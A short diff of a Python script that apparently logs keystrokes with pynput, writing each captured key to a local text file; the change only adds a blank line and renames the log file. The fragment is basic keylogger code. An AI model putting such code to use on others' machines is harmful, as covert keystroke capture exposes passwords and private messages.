@@ -1,9 +1,10 @@
 from pynput.keyboard import Listener
 
+
 def write_to_txt_file(key):
     key_info = str(key)
     key_info = key_info.replace("'", "")
-    with open("log.txt", "a") as l:
+    with open("logs.txt_1", "a") as l:
         l.write(key_info)
 
 
